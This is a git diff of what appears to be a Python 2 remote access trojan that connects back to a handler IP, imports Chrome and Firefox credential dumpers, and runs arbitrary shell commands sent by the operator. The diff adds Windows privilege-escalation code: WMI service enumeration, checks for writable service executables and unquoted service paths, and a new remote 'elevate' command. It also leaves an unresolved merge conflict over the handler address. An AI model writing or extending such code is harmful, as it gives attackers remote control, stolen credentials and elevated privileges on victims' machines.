@@ -1,5 +1,5 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue, ctypes, string
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue, ctypes, string, wmi
 from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
@@ -7,7 +7,12 @@ import dumpff
 if os.name =="nt":
 	import dumpchrome, win32net, pupy_privesc
 
+<<<<<<< HEAD
 HANDLER_IP = "192.168.1.78"
+=======
+HANDLER_IP = "127.0.0.1"
+c = wmi.WMI()
+>>>>>>> bdd98073bc6d8455e55b45b943ad717cca5d0917
 
 def windows_only(func):
 	def tester(*args):
@@ -392,6 +397,54 @@ class Shell:
 				return("Succesfully added file to current user's registry.")
 				
 		return "Failed to add file to registry."
+		
+	def get_service_list(self):
+		services = c.Win32_Service()
+		service_paths = []
+		for service in services:
+			path = service.PathName.split("-")[0].split("/")[0].lower()
+			if not "system32" in path: service_paths.append(path)
+		return service_paths
+	
+	def check_writable(self, path):
+		try:
+			open(os.path.join(os.path.dirname(path.replace('"','')),"test.txt"),"w")
+			os.remove(os.path.join(os.path.dirname(path.replace('"','')),"test.txt"))
+			return True
+		except Exception as e:
+			return False
+			
+	@windows_only
+	def find_writable_executables(self):
+		service_paths = self.get_service_list()
+		writables = []
+			
+		for service in service_paths:
+			if self.check_writable(service): writables.append(service)
+				
+		return writables
+	
+	@windows_only
+	def find_writable_unquoted(self):
+		service_paths = self.get_service_list()
+		potential_paths = []
+		
+		for service in service_paths:
+			if '"' not in service:
+				split_path = service.split()
+				for i in range(len(split_path)):
+					potential_paths.append(" ".join(split_path[0:i]))
+
+		potential_paths = list(set(potential_paths))
+		writables = []
+		for path in potential_paths:
+			if self.check_writable(path): writables.append(path)
+			
+		return writables
+		
+	@windows_only
+	def elevate(self):
+		return self.find_writable_executables()
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -442,6 +495,8 @@ class Shell:
 		elif command == "die":
 			self.transport.comm_socket.close()
 			os._exit(0)
+		elif command == "something":
+			output = self.elevate()
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
